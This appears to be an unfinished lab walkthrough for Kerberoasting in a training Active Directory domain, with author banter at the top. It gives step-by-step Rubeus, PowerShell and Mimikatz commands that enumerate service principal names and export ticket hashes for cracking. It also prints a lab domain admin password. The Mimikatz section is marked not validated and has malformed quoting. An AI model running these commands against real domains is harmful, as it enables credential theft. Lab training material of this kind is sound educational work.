# Common Kerberoasting

RYAN> Fill this all out and make it purty, boyfriend!!!

BRANDON> Just commands for now, but this is what I'll be running :).


At this point you should still be RDP'd to TWORIVERS from the attack machine. On TWORIVERS, do the following:

## Kerberoasting via Rubeus

1. Use RunAs to run a PowerShell prompt as `WHEEL\Administrator`:
    1. Start menu -> type `run` -> click "Run (App)" -> Enter `runas /user:wheel\Administrator powershell.exe` -> Enter/Click OK
    - You will be prompted to `Enter the password for wheel\Administrator:`, at point you will enter the account's password:
        - `12qwaszx!@QWASZX`
    
    A new PowerShell prompt with the title `Administrator: powershell.exe (running as wheel\Administrator` will open. Good!

    Now that we are running PowerShell as a domain admin, let's enumerate AD!

1. Extract Rubeus:
    ```
    cd C:\Users\Public\Desktop\LAB_FILES\assets\
    expand-archive ./Rubeus-1.6.4.zip
    cd .\Rubeus-1.6.4\Rubeus-1.6.4\
    ```

1. Perform a Kerberoasting attack using Rubeus:
    1. `./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt`

WHOOPS!!! Need .NET Framework 3.5!


---------------not validated/done------------------------

## Kerberoasting via Mimikatz

1. In PowerShell:
    
    ```
    "get-aduser -filter * -properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl
    ```

    ```
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""VULN SPN GOES HERE"""
    ```

1. In Mimikatz:

    ```
    privilege::debug
    log m2.txt
    kerberos::list /export"
    ```
